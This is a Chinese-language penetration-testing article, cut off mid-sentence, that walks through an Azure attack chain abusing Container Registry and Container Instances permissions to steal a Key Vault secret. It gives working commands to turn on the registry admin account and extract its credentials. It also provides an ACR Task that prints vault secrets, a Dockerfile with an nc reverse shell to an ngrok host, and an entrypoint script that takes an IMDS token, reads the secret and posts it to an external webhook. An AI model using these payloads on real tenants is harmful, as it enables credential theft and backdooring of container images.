---
title: 云上攻防 Azure 容器之 ACR-ACI 攻击链
url: https://xz.aliyun.com/news/93258
source: 先知安全技术社区
date: 2026-11-11
fetch_date: 2026-11-12T09:00:35.051802
---

# 云上攻防 Azure 容器之 ACR-ACI 攻击链

[先知社区](/)[文章](/news)[视频](/course)[众测](/vuln)[赛事](/ctf)[技能](/skills)[墨白](/mobai)[活动](/events)[名人堂](/hof)[积分商城](/points-mall)

[写文章](/write)

有用收藏打赏分享

# 云上攻防 Azure 容器之 ACR-ACI 攻击链

[![](/images/default-avatar.png)闲\*人](/users/114143)·2026-11-12 00:22·10 分钟·33·广东·渗透测试

本文分析Azure中利用ACR和ACI权限，通过篡改镜像Entrypoint注入窃取IMDS令牌并读取Key Vault密钥，经HTTPS Webhook外带数据的攻击链。

# 前言

云上攻防做久了会有存在一个习惯，拿到凭据就直奔 VM而后翻数据、翻 IMDS，容器端口不对外往往被当成跑代码的黑盒。Azure 容器相关服务（ACR、ACI、ACR Tasks）攻击面经常被忽略，传统替换镜像插入反弹 shell 的方案在云环境很不稳定，对此可用一种新的攻击手段：把 IMDS 元数据窃取逻辑写进容器 Entrypoint，不需要持久反弹 shell，直接外排密钥。

这篇文章记录的是一次以密钥为目标的演练。整个过程最值得写的不是哪条命令好用，而是常规手段 ENTRYPOINT 反弹 Shell 反复失败后思路的转变，变成了让容器自己在启动时替我干活，于是整条链路的性质都变了。

# 场景

起点：从供应链的配置拿到一个低权限账号，容器上的权限为 `Contributor`
目标：拿到 Key Vault 里那个名为 `Image` 的密钥

# 阶段一：权限测绘与注册表接管

1、拿当前登录账号的 Entra ID，而后查询自己当前账号在 ACR 上的角色分配，结果为 `Contributor`。列出租户下全部 ACR 注册表。

```
az ad signed-in-user show --query id -o tsv

az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --scope $(az acr show -n registryfr --query id -o tsv) -o table
```

![](https://xzfile.aliyuncs.com/2026/11/12/0007/b8879848-66f.png)

```
az acr list
```

![](https://xzfile.aliyuncs.com/2026/11/12/0007/91bc2291-60e.png)

2、检查 ACR 管理员账号是否开启，结果为 true 。如果管理员未开启，攻击者可以直接打开 Admin 账号（需要`Microsoft.ContainerRegistry/registries/write`权限）

```
az acr show -g <RG> -n <ACR> --query "adminUserEnabled"

az acr update --resource-group <RESOURCE_GROUP> --name <ACR> --admin-enabled true
```

![](https://xzfile.aliyuncs.com/2026/11/12/0008/bbc9efb3-304.png)![](https://xzfile.aliyuncs.com/2026/11/12/0008/f034747e-7c6.png)

3、获取 ACR 管理员账号的密码，尝试登陆

```
az acr credential show -n <ACR> -o tsv --query "passwords[0].value"
docker login $ACR_NAME.azurecr.io -u <REGISTRY_NAME> -p <PASSWORD>
```

![](https://xzfile.aliyuncs.com/2026/11/12/0008/dcab0705-aaa.png)![](https://xzfile.aliyuncs.com/2026/11/12/0008/7e1c6bec-1d3.png)

使用凭证成功登陆 docker，后续可以管理员用户身份列出镜像

# 阶段二：镜像仓库就是代码仓库

企业镜像里塞进去的东西比想象中多：调试用的环境变量、硬编码的连接串、被 `COPY` 进去的 `.env`、构建时残留的凭证。
1、把本地 Docker 镜像推送到 Azure 容器注册表（ACR，Azure Container Registry），之后再从 ACR 拉回来

```
docker tag <IMAGE> <ACR_NAME>.azurecr.io/<IMAGE>:<TAG> && docker push <ACR_NAME>.azurecr.io/<IMAGE>:<TAG>
docker images
docker pull $ACR_NAME.azurecr.io/<IMAGE>:<TAG>
```

![](https://xzfile.aliyuncs.com/2026/11/12/0009/bedb5ff7-2e9.png)![](https://xzfile.aliyuncs.com/2026/11/12/0009/0f0162e8-56f.png)![](https://xzfile.aliyuncs.com/2026/11/12/0009/679fccd3-272.png)

2、接着可以用下列手段，查看镜像镜像内文件
这些手段只看最终文件系统 + `Config.Env`，看不到构建期 ARG、被覆盖的层和中间层

```
dive <ACR>.azurecr.io/<IMAGE>:<TAG>

cid=$(docker create <ACR>.azurecr.io/<IMAGE>:<TAG>)
docker cp $cid:/ ./extracted && docker rm $cid

docker inspect <ACR>.azurecr.io/<IMAGE>:<TAG> | jq '.[0].Config.Env[]'
```

结果是，这次没在镜像里挖到 Key Vault 的访问凭据。

# 阶段三：拿 secret 的几种姿势

## 方式一：ACR Task

权限前提：`registries/tasks/write`，且目标任务挂着有 vault 读权限的托管身份。
特点：不碰容器运行时，不产生可疑进程，证据只在 ARM 审计日志和构建日志里。从 Azure KeyVault 读取密钥，在云端执行命令，靠托管身份去访问 KeyVault 拿秘钥。
1、查看 ACR Task 绑定的托管身份信息

```
az acr task show --registry <ACR> --name <TASK> --query identity
```

如果返回 `SystemAssigned` 且有 principalId，那么这个任务的身份就有它自己的 RBAC。而 Task 的定义文件里，`secrets` 段原生支持从 Key Vault 挂载，`steps` 段原生支持把 secret 打印出来：

2、创建任务文件 acr-task.yaml ，ACR Task 会使用托管身份去拉取 AKV 密钥，执行 bash 打印 secret

```
version: v1.1.0
secrets:
  - id: <SECRET_NAME>
    keyvault: https://<VAULT>.vault.azure.net/secrets/<SECRET_NAME>
steps:
  - command: bash echo 'Secret={{.Secrets.<SECRET_NAME>}}'
```

3、手动触发执行这个 ACR Task

```
az acr task create --registry <REGISTRY_NAME> --name <TASK_NAME> --file acr-task.yaml --context /dev/null --assign-identity

az acr task run --registry <REGISTRY_NAME> --name <TASK_NAME>
```

`--assign-identity`：给这个 Task 自动创建系统分配托管身份，也就是前面 `az acr task show` 查询的 identity。

![](https://xzfile.aliyuncs.com/2026/11/12/0009/f3756f8d-201.png)![](https://xzfile.aliyuncs.com/2026/11/12/0009/1f9bf7f2-358.png)

这条路是可行，它证明了这个订阅里确实存在托管身份到 Key Vault 的信任链，但构建会留下日志，可以的话还是尝试其他方式。

## 方式二：经典反弹 Shell

**前提权限**：`registries/push/write` + `containerGroups/restart/action`，另加一条可用的出网回连通道。
**特征**：交互性强，但依赖双向长连接，对出口策略极其敏感。
这是教科书方案，也是我先试的方案，它在这个环境里失败了。

### 通道建设：Token + Scope Map

admin 凭据能用，但它动静大、没有过期时间，不适合作为后续反复推镜像的通道。更稳的做法是造一个仅限特定仓库的 token：建 ACR 仓库级细粒度访问令牌（Token），搭配范围映射 (scope-map)，权限可以精确控制到某个镜像仓库，遵循最小权限原则

所以更稳的做法是造一个仅限特定仓库的 token：

1、创建 ACR 访问令牌，绑定创建好的 Scope Map。用创建的 ACR Token 登录容器仓库

```
az acr token create --name <TOKEN> --registry <ACR> --scope-map <SCOPE_MAP>
docker login <ACR>.azurecr.io -u <TOKEN> -p '<TOKEN_PASSWORD>'
```

![](https://xzfile.aliyuncs.com/2026/11/12/0010/b6250a85-687.png)

其中 ScopeMap 就是权限规则集，定义允许操作哪些镜像仓库、能做什么动作，示例如下：

![](https://xzfile.aliyuncs.com/2026/11/12/0010/c93166b3-0a7.png)

2、同样登录后就能执行权限内的操作，docker pull 拉镜像后，可以用这些命令查看容器内镜像内容，关键是检查镜像是否把密钥写进镜像 ENV 里，但结果是未发现有价值信息。

```
dive $ACR_NAME.azurecr.io/<IMAGE>:<TAG>

container_id=$(docker create <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG>)

docker cp $container_id:/ ./extracted_container
Successfully copied 154MB to /home/extracted_container

docker rm $container_id
0b8bebd775f53a4f0vbeb4c7d25fg4a5d6175fba18d56e217e33c39693b43f88

docker inspect <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG> | jq '.[0].Config.Env[]' | grep 'secret'
```

### 反弹shell：镜像替换

1、这里我们以 HSmith@xxxxx.microsoft 用户身份登录，该用户对容器注册表拥有必要的权限，来完成替换镜像反弹shell功能。

```
az account show
```

![](https://xzfile.aliyuncs.com/2026/11/12/0010/684612cc-141.png)

2、列出ACR 实例，查镜像有哪些版本标签，用当前Entra 身份自动登录 Docker 客户端到 ACR，成功登陆就可无需密码进行 pull、tag 、push 操作。

```
az acr list
az acr repository list --name <REGISTRY_NAME>
az acr login --name <REGISTRY_NAME>
docker pull <IMAGE>
```

![](https://xzfile.aliyuncs.com/2026/11/12/0011/1e07a62b-d08.png)

3、接下来修改镜像，添加反弹shell功能
第一次使用的 Dockerfile 长这样

```
FROM python:3.9-slim

RUN apt-get update && \
    apt-get install -y netcat-traditional

WORKDIR /app

CMD nc -e /bin/bash <NGROK_HOST> <PORT>
```

4、配套的动作，打上 ACR 仓库标签，把带后门镜像推送到 Azure ACR 来覆盖原有镜像。
restart 重启 ACI 容器实例， 预期是 restart后收到反弹shell。

```
# 监听、构建、推送、重启
ngrok tcp <PORT>
nc -lvnp <PORT>
docker build -t <ACR>.azurecr.io/<IMAGE>:<TAG> .
docker push <ACR>.azurecr.io/<IMAGE>:<TAG>
az container restart -g <RG> -n <CONTAINER>
```

![](https://xzfile.aliyuncs.com/2026/11/12/0011/e6177a82-bfd.png)![](https://xzfile.aliyuncs.com/2026/11/12/0011/473cce83-e37.png)

5、容器信息如下：

![](https://xzfile.aliyuncs.com/2026/11/12/0011/38acadaa-e36.png)

6、重启后按道理是可以收到反弹shell，但实际并未收到。容器环境，可能是链路没通，推测可能是出口被拦了。解决办法是我所发现的一种方案，我如果不需要通道呢，想办法不再依赖持久化的反弹 Shell 连接

## 方式三：镜像替换 + entrypoint 外带

前提权限：`registries/push/write` + `containerGroups/restart/action`。
特征：纯 443 出向、无 Shell、无长连接，镜像 tag 本身就是持久化载体。

思路是把 IMDS 令牌窃取和密钥外带直接写进 Dockerfile 的 entrypoint，容器一启动就自己完成「要令牌 → 读 vault → 发 webhook」。

### 新思路：外带 webhook

1、常规思路是进到容器里，然后从里面往外打。新思路是不进去，让容器在启动的那一刻自己完成采集，然后把结果单向丢出来。
这个转换的前提是一个很容易被忽略的事实：在容器环境里，镜像的写权限（`AcrPush`）加上容器组的重启权限（`containerGroups/restart`），等价于以工作负载托管身份执行任意代码。
这里没有 exec，没有进程注入，没有 Shell，没有 RCE 漏洞。控制面的两个写操作，直接兑换成了数据面的代码执行权限。这是整件事最反直觉的地方，也是它能绕过绝大多数运行时防护的原因。

2、Dockerfile 的 payload 的逻辑为三段：向 IMDS 要一个 Key Vault 的令牌、用令牌兑换密钥、单向外带。

```
FROM python:3.9-slim

RUN apt-get update && \
    apt-get install -y bash curl jq ca-certificates && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

RUN printf '%s\n' \
    '#!/bin/bash' \
    'echo "Container starting..."' \
    '' \
    'TOKEN=$(curl -s -H Metadata:true \' \
    '  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \' \
    '  | jq -r .access_token)' \
    '' \
    'SECRET=$(curl -s -H "Authorization: Bearer $TOKEN" \' \
    '  "https://<VAULT>.vault.azure.net/secrets/Image?api-version=7.4" \' \
    '  | jq -r .value)' \
    '' \
    'curl -s -X POST -H "Content-Type: application/json" \' \
    '  -d "{\"secret\":\"$SECRET\"}" https://<WEBHOOK>' \
    '' \
    'sleep 3600' \
    > /entrypoint.sh && chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
```

![](https://xzfile.aliyuncs.com/2026/11/12/0012/ea8b0ba0-37d.png)

3、三个技术要点：
IMDS 端点必须是 `169.254.169.254`（链路本地地址），必须带 `Metadata: true` 请...